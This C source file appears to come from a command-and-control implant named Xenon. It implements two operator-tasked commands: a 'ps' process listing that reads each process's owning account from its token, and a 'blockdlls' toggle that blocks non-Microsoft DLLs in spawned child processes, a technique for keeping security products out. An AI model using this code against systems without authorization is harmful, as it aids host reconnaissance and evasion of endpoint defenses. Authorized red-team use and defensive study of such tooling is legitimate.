#include "Xenon.h"
#include "Tasks/Process.h"

#include "Spawn.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Identity.h"

#include <tlhelp32.h>

#ifdef INCLUDE_CMD_PS

BOOL GetAccountNameFromToken(HANDLE hProcess, char* accountName, int length) 
{
	HANDLE hToken;
	BOOL result = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (!result)
		return FALSE;

	result = IdentityGetUserInfo(hToken, accountName, length);
	if (!result)
		return FALSE;

	CloseHandle(hToken);
	return result;
}

VOID ProcessList(PCHAR taskUuid, PPARSER arguments) 
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    char accountName[2048] = { 0 };

    // Output data
    PPackage locals = PackageInit(0, FALSE);

	char* arch;
	if (IsWow64ProcessEx(GetCurrentProcess())) {
		arch = "x86";
	} else {
		arch = "x64";
	}

	HANDLE toolhelp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (toolhelp == INVALID_HANDLE_VALUE) {
		goto cleanup;
	}

	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (Process32First(toolhelp, &pe)) {
		do {
			HANDLE hProcess = OpenProcess(SelfIsWindowsVistaOrLater() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
			DWORD sid;
			if (hProcess) {
				if (!GetAccountNameFromToken(hProcess, accountName, sizeof(accountName))) {
					_err("Failed to get account from token : %s", pe.szExeFile);
					accountName[0] = '\0';
				}
				if (!ProcessIdToSessionId(pe.th32ProcessID, &sid)) {
					sid = -1;
				}

				BOOL isWow64 = IsWow64ProcessEx(hProcess);

				PackageAddFormatPrintf(locals,
                    FALSE,
					"%s\t%d\t%d\t%s\t%s\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID,
					isWow64 ? "x86" : arch,
					accountName,
					sid);
			}
			else {
				PackageAddFormatPrintf(locals,
                    FALSE,
					"%s\t%d\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID);
			}
			CloseHandle(hProcess);
		} while (Process32Next(toolhelp, &pe));

	} else {
        DWORD error = GetLastError();
        PackageError(taskUuid, error);
        goto cleanup;
	}

    // Success
    PackageComplete(taskUuid, locals);

cleanup:
	if (toolhelp)
		CloseHandle(toolhelp);

    PackageDestroy(locals);
}
#endif	//INCLUDE_CMD_PS


#ifdef INCLUDE_CMD_BLOCKDLLS
/**
 * @brief Enable or disable the blockdlls setting.
 *        When enabled, newly spawned child processes will have
 *        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
 *        applied, preventing unsigned DLLs from loading.
 *
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing "start" or "stop".
 * @return VOID
 */
VOID ProcessBlockDlls(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        // No argument - report current status
        PPackage data = PackageInit(0, FALSE);
        PackageAddFormatPrintf(data, FALSE, "blockdlls: %s\n",
            xenonConfig->blockDlls ? "enabled" : "disabled");
        PackageComplete(taskUuid, data);
        PackageDestroy(data);
        return;
    }

    SIZE_T size  = 0;
    PCHAR  state = ParserStringCopy(arguments, &size);

    if (_stricmp(state, "start") == 0)
        xenonConfig->blockDlls = TRUE;
    else
        xenonConfig->blockDlls = FALSE;

    PPackage data = PackageInit(0, FALSE);
    PackageAddFormatPrintf(data, FALSE, "blockdlls: %s\n",
        xenonConfig->blockDlls ? "enabled" : "disabled");
    PackageComplete(taskUuid, data);
    PackageDestroy(data);
    LocalFree(state);
}
#endif	//INCLUDE_CMD_BLOCKDLLS